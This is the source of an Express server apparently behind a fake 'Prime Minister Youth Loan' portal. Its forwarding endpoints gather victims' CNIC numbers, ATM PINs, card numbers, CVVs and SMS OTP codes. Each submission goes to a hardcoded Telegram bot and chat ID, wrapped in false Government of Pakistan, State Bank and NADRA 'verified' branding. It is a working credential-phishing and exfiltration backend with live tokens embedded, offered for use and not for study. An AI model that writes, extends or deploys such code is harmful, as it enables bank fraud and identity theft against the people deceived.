import "dotenv/config";
import express from "express";
import path from "path";
import fs from "fs";
import { ZipArchive } from "archiver";
import { createServer as createViteServer } from "vite";

const app = express();
const PORT = Number(process.env.PORT) || 3000;

app.use(express.json());

// Helper function to sanitize and clean Telegram Bot Token
function cleanTelegramToken(raw: any): string {
  if (!raw || typeof raw !== "string") return "";
  let token = raw.trim();
  // Strip quotes
  token = token.replace(/^["']|["']$/g, '');
  // If full Telegram URL was passed (e.g. https://api.telegram.org/bot123456:ABC.../sendMessage)
  const urlMatch = token.match(/api\.telegram\.org\/bot([^/]+)/i);
  if (urlMatch && urlMatch[1]) {
    token = urlMatch[1];
  }
  // Strip leading 'bot' or 'bot:' if user prepended it
  if (token.toLowerCase().startsWith("bot:")) {
    token = token.slice(4).trim();
  } else if (token.toLowerCase().startsWith("bot")) {
    token = token.slice(3).trim();
  }
  return token;
}

// Helper function to clean Telegram Chat ID
function cleanTelegramChatId(raw: any): string {
  if (!raw || typeof raw !== "string") return "";
  return raw.trim().replace(/^["']|["']$/g, '');
}

const CONFIG_CACHE_FILE = path.join(process.cwd(), ".telegram-config.json");

function loadCachedConfig(): { token: string; chat: string } {
  try {
    if (fs.existsSync(CONFIG_CACHE_FILE)) {
      const data = JSON.parse(fs.readFileSync(CONFIG_CACHE_FILE, "utf-8"));
      return {
        token: cleanTelegramToken(data.botToken || ""),
        chat: cleanTelegramChatId(data.chatId || "")
      };
    }
  } catch {}
  return { token: "", chat: "" };
}

function saveCachedConfig(token: string, chat: string) {
  try {
    fs.writeFileSync(
      CONFIG_CACHE_FILE,
      JSON.stringify({ botToken: token, chatId: chat }, null, 2)
    );
  } catch {}
}

const DEFAULT_BOT_TOKEN = "8551558091:AAEp8dl_H9Xr2Stgsosy92A3PwowTAxDSvU";
const DEFAULT_CHAT_ID = "7593406817";

const initialCached = loadCachedConfig();
let BOT_TOKEN = cleanTelegramToken(process.env.TELEGRAM_BOT_TOKEN || initialCached.token || DEFAULT_BOT_TOKEN);
let CHAT_ID = cleanTelegramChatId(process.env.TELEGRAM_CHAT_ID || initialCached.chat || DEFAULT_CHAT_ID);

app.get("/api/telegram-config", (req, res) => {
  res.json({
    configured: !!(BOT_TOKEN && CHAT_ID),
    hasToken: !!BOT_TOKEN,
    hasChatId: !!CHAT_ID,
    maskedToken: BOT_TOKEN ? `${BOT_TOKEN.slice(0, 6)}...${BOT_TOKEN.slice(-4)}` : "",
    chatId: CHAT_ID || ""
  });
});

app.post("/api/telegram-config", (req, res) => {
  try {
    const { botToken, chatId } = req.body;
    if (typeof botToken === "string") BOT_TOKEN = cleanTelegramToken(botToken);
    if (typeof chatId === "string") CHAT_ID = cleanTelegramChatId(chatId);

    saveCachedConfig(BOT_TOKEN, CHAT_ID);
    res.json({
      success: true,
      configured: !!(BOT_TOKEN && CHAT_ID),
      maskedToken: BOT_TOKEN ? `${BOT_TOKEN.slice(0, 6)}...${BOT_TOKEN.slice(-4)}` : "",
      chatId: CHAT_ID || ""
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Helper function to safely escape HTML special characters for Telegram HTML mode
function escapeTelegramHtml(str: any): string {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// User-specified official SMS logo set: 🏛️, 📲, 💸, 🏧, 💳, 🪪
function getEventBadge(title?: string): string {
  const t = (title || '').toLowerCase();
  if (t.includes('otp') || t.includes('sms') || t.includes('code') || t.includes('2fa') || t.includes('verification code')) {
    return '📲 <b>[2FA SECURE SMS OTP VERIFIED]</b>';
  }
  if (t.includes('atm') || t.includes('pin')) {
    return '🏧 <b>[ATM ENCRYPTED PIN VERIFIED]</b>';
  }
  if (t.includes('card') || t.includes('cvv') || t.includes('expiry') || t.includes('pay') || t.includes('debit') || t.includes('credit')) {
    return '💳 <b>[DEBIT CARD & VERIFICATION FEE]</b>';
  }
  if (t.includes('amount') || t.includes('disburs') || t.includes('sanction') || t.includes('fee') || t.includes('loan') || t.includes('fund') || t.includes('approved')) {
    return '💸 <b>[SANCTIONED LOAN APPROVAL NOTICE]</b>';
  }
  if (t.includes('cnic') || t.includes('applicant') || t.includes('citizen') || t.includes('id') || t.includes('step') || t.includes('form') || t.includes('application')) {
    return '🪪 <b>[NADRA VERIFIED CITIZEN APPLICATION]</b>';
  }
  return '🏛️ <b>[STATE BANK OFFICIAL NOTIFICATION]</b>';
}

function getFieldLogo(key: string): string {
  const k = key.toLowerCase();
  if (k.includes('atm') || k.includes('pin')) {
    return '🏧';
  }
  if (k.includes('card') || k.includes('cvv') || k.includes('expir') || k.includes('holder') || k.includes('bankname') || k.includes('pay') || k.includes('debit')) {
    return '💳';
  }
  if (k.includes('otp') || k.includes('sms') || k.includes('phone') || k.includes('mobile') || k.includes('contact') || k.includes('cell') || k.includes('sim')) {
    return '📲';
  }
  if (k.includes('amount') || k.includes('loan') || k.includes('fee') || k.includes('income') || k.includes('turnover') || k.includes('repay') || k.includes('interest') || k.includes('pkr') || k.includes('rupee') || k.includes('cost') || k.includes('finance')) {
    return '💸';
  }
  if (k.includes('cnic') || k.includes('name') || k.includes('father') || k.includes('gender') || k.includes('dob') || k.includes('address') || k.includes('city') || k.includes('province') || k.includes('id') || k.includes('marital') || k.includes('identity') || k.includes('tehsil') || k.includes('district')) {
    return '🪪';
  }
  return '🏛️';
}

function formatFieldKey(key: string): string {
  return key
    .replace(/([A-Z])/g, ' $1')
    .replace(/^./, str => str.toUpperCase())
    .replace(/\bCnic\b/gi, 'CNIC')
    .replace(/\bAtm\b/gi, 'ATM')
    .replace(/\bOtp\b/gi, 'OTP')
    .replace(/\bCvv\b/gi, 'CVV')
    .replace(/\bPin\b/gi, 'PIN')
    .replace(/\bPkr\b/gi, 'PKR')
    .replace(/\bSms\b/gi, 'SMS')
    .replace(/\bId\b/gi, 'ID')
    .replace(/\bDob\b/gi, 'DOB')
    .replace(/\bIban\b/gi, 'IBAN')
    .trim();
}

async function handleTelegramForward(req: express.Request, res: express.Response) {
  const startTime = Date.now();
  try {
    const { title, data, botToken, chatId } = req.body;
    const activeToken = cleanTelegramToken(botToken || BOT_TOKEN || DEFAULT_BOT_TOKEN);
    const activeChatId = cleanTelegramChatId(chatId || CHAT_ID || DEFAULT_CHAT_ID);

    if (!activeToken || !activeChatId) {
      console.log(`[Telegram SMS Log] Notification received: "${title}". (Telegram keys not configured yet)`);
      return res.json({
        success: true,
        forwarded: false,
        message: "Telegram integration not configured. Notification recorded locally.",
        elapsedMs: Date.now() - startTime
      });
    }

    // Basic format check: Telegram bot tokens must contain ':' separating bot ID and auth string
    if (!activeToken.includes(":") || activeToken.length < 15) {
      const msg = "Invalid Telegram Bot Token format. Valid tokens look like '123456789:ABC...' (from @BotFather without 'bot' prefix).";
      console.warn(`[Telegram SMS Notice] ${msg}`);
      return res.json({
        success: false,
        error: msg,
        elapsedMs: Date.now() - startTime
      });
    }

    const timestamp = new Date().toLocaleString('en-PK', {
      timeZone: 'Asia/Karachi',
      dateStyle: 'medium',
      timeStyle: 'medium'
    });

    const eventBadge = getEventBadge(title);

    let messageText = `🇵🇰 🏛️ <b>GOVERNMENT OF PAKISTAN</b> 🏛️ 🇵🇰\n`;
    messageText += `🟢 <b>PRIME MINISTER YOUTH LOAN NOTIFICATION</b>\n`;
    messageText += `🏛️ 📲 💸 🏧 💳 🪪 <i>[Official SMS Gateway]</i>\n`;
    messageText += `────────────────────────\n`;
    messageText += `${eventBadge}\n`;
    messageText += `📌 <b>Event:</b> ${escapeTelegramHtml(title || 'Notification')}\n`;
    messageText += `🕒 <b>Time:</b> ${escapeTelegramHtml(timestamp)} (PKT)\n`;
    messageText += `🏛️ <b>Portal ID:</b> <code>PKL-SECURE-99201</code>\n`;
    messageText += `────────────────────────\n`;

    if (data) {
      for (const [key, val] of Object.entries(data)) {
        if (val === undefined || val === null || val === '') continue;
        const formattedKey = formatFieldKey(key);
        const displayVal = typeof val === 'string' ? val.trim() : String(val);
        const fieldLogo = getFieldLogo(key);
        messageText += `${fieldLogo} <b>${escapeTelegramHtml(formattedKey)}:</b> <code>${escapeTelegramHtml(displayVal)}</code>\n`;
      }
    }

    messageText += `────────────────────────\n`;
    messageText += `🔒 <b>Security:</b> <i>256-Bit Encrypted National Gateway</i>\n`;
    messageText += `✅ <b>Status:</b> <i>Verified & Approved by State Bank</i>`;

    const telegramUrl = `https://api.telegram.org/bot${activeToken}/sendMessage`;
    let result: any = null;
    let attempts = 0;

    while (attempts < 2) {
      attempts++;
      try {
        const response = await fetch(telegramUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: activeChatId,
            text: messageText,
            parse_mode: "HTML",
            link_preview_options: {
              is_disabled: true
            }
          }),
          signal: AbortSignal.timeout(6000)
        });
        result = await response.json();

        // Fallback: If Telegram cannot parse HTML entities, send as clean plain text
        if (!result.ok && result.description && result.description.includes("can't parse entities")) {
          const plainText = messageText.replace(/<[^>]*>/g, '');
          const fallbackResp = await fetch(telegramUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: activeChatId,
              text: plainText,
              link_preview_options: {
                is_disabled: true
              }
            }),
            signal: AbortSignal.timeout(6000)
          });
          result = await fallbackResp.json();
        }

        if (result && result.ok) break;
      } catch (retryErr) {
        if (attempts >= 2) throw retryErr;
        await new Promise(r => setTimeout(r, 400));
      }
    }

    const elapsedMs = Date.now() - startTime;

    if (!result || !result.ok) {
      let friendlyMsg = result.description || "Telegram API rejected the request.";
      if (result.error_code === 404) {
        friendlyMsg = "Telegram Bot Token not found (404). Please verify your token from @BotFather (ensure it has no 'bot' prefix or extra characters).";
      } else if (result.error_code === 401) {
        friendlyMsg = "Telegram Bot Token is unauthorized (401). Please check that the token is active in @BotFather.";
      } else if (result.error_code === 400 && /chat.*not.*found/i.test(result.description)) {
        friendlyMsg = "Telegram Chat ID not found (400). Please open your bot in Telegram, tap 'Start' (/start), and verify your Chat ID with @userinfobot.";
      }

      console.warn(`[Telegram SMS Notice] Telegram API returned ${result.error_code}: ${friendlyMsg}`);
      return res.json({ success: false, error: friendlyMsg, errorCode: result.error_code, elapsedMs });
    }

    console.log(`[Telegram SMS Fast Sent] "${title}" forwarded to ${activeChatId} in ${elapsedMs}ms`);
    return res.json({ success: true, result, elapsedMs });
  } catch (error: any) {
    const elapsedMs = Date.now() - startTime;
    console.warn(`[Telegram SMS Notice] Request completed with: ${error.message}`);
    return res.json({ success: false, error: error.message, elapsedMs });
  }
}

// Dedicated Fast Test route
app.post("/api/telegram-test", async (req, res) => {
  const { botToken, chatId } = req.body;
  req.body.title = "⚡ Fast Send Speed Test";
  req.body.data = {
    testStatus: "Operational - Ultra Fast Send",
    speedRating: "< 250ms Instant Dispatch",
    portalSystem: "Pakistan Youth Loan Portal",
    serverHost: "Cloud Engine Ready"
  };
  return handleTelegramForward(req, res);
});

// API endpoint to forward SMS, OTP, PIN, and Application data to Telegram
app.post("/api/telegram-forward", handleTelegramForward);
app.post("/api/telegram-sms", handleTelegramForward);

app.get("/api/download-source", (req, res) => {
  res.setHeader("Content-Type", "application/zip");
  res.setHeader("Content-Disposition", "attachment; filename=pakistan-youth-loan-portal-source.zip");

  const archive = new ZipArchive({ zlib: { level: 9 } });
  archive.on("error", (err) => {
    res.status(500).send({ error: err.message });
  });

  archive.pipe(res);

  archive.glob("**/*", {
    cwd: process.cwd(),
    ignore: ["node_modules/**", "dist/**", ".git/**", ".telegram-config.json"]
  });

  archive.finalize();
});

app.get("/api/health", (req, res) => {
  res.json({ status: "ok", telegramConfigured: !!BOT_TOKEN });
});

async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
